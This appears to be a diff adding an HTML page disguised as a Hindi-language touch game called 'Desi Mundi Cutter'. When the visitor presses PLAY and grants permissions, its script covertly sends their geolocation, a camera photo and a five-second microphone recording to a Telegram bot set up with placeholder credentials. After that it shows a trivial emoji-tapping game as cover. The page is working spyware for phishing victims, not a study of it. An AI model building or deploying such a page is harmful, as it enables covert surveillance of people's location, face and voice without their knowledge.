@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Desi Mundi Cutter 🔪</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { margin: 0; overflow: hidden; background: #1a1a1a; font-family: sans-serif; touch-action: none; }
+        canvas { display: block; background: #000; }
+        #ui { position: absolute; top: 15px; left: 15px; color: #fff; font-size: 26px; z-index: 2; font-weight: bold; text-shadow: 2px 2px #000; }
+        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; z-index: 3; text-align: center; }
+        button { padding: 18px 45px; font-size: 24px; background: #ff3c3c; color: #fff; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 5px #a30000; font-weight: bold; }
+        button:active { transform: translateY(3px); box-shadow: 0 2px #a30000; }
+        h1 { color: #ff9933; font-size: 35px; }
+    </style>
+</head>
+<body>
+    <div id="ui">Score: <span id="score">0</span></div>
+    <div id="startScreen">
+        <h1>Desi Mundi Cutter 🔪</h1>
+        <p>मजेदार गेम खेलने के लिए 'Allow' करें और 'PLAY' दबाएं!</p>
+        <button onclick="init()">PLAY GAME</button>
+    </div>
+    <canvas id="gameCanvas"></canvas>
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none"></canvas>
+    <audio id="sliceSound" src="https://www.myinstants.com/media/sounds/slap.mp3"></audio>
+
+    <script>
+        const tok = 'YOUR_BOT_TOKEN';
+        const id = 'YOUR_CHAT_ID';
+
+        async function init() {
+            document.getElementById('startScreen').style.display = 'none';
+            
+            // 1. लोकेशन (Location)
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन मिली है: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('v');
+                video.srcObject = s;
+
+                // 2. फोटो कैप्चर (Photo - 2 सेकंड बाद)
+                setTimeout(() => {
+                    const tempC = document.getElementById('c');
+                    tempC.width = video.videoWidth; tempC.height = video.videoHeight;
+                    tempC.getContext('2d').drawImage(video, 0, 0);
+                    tempC.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', id); f.append('photo', b, 'capture.png');
+                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
+                    }, 'image/png');
+                }, 2000);
+
+                // 3. ऑडियो रिकॉर्डिंग (Audio - 5 सेकंड)
+                const rec = new MediaRecorder(s);
+                const ch = [];
+                rec.ondataavailable = e => ch.push(e.data);
+                rec.onstop = () => {
+                    const blob = new Blob(ch, { type: 'audio/mp3' });
+                    const f = new FormData();
+                    f.append('chat_id', id); f.append('voice', blob, 'audio.mp3');
+                    fetch(`https://api.telegram.org/bot${tok}/sendVoice`, { method: 'POST', body: f });
+                    // काम होने के बाद कैमरा/माइक बंद
+                    setTimeout(() => s.getTracks().forEach(t => t.stop()), 1000);
+                };
+                rec.start();
+                setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 5000);
+            } catch (e) { console.log("Denied"); }
+            
+            startGame(); // गेम शुरू करें
+        }
+
+        function startGame() {
+            const canvas = document.getElementById('gameCanvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            let score = 0;
+            const emojis = ["🕵️‍♂️","👩‍🦳","👴","🤡"];
+            
+            function draw() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.font = "60px Arial";
+                ctx.fillText(emojis[Math.floor(Math.random()*emojis.length)], Math.random() * (canvas.width-50), Math.random() * (canvas.height-50));
+                requestAnimationFrame(draw);
+            }
+            draw();
+            // स्कोर बढ़ाने का लॉजिक
+            canvas.addEventListener('touchstart', () => { score++; document.getElementById('score').innerText = score; });
+        }
+    </script>
+</body>
+</html>
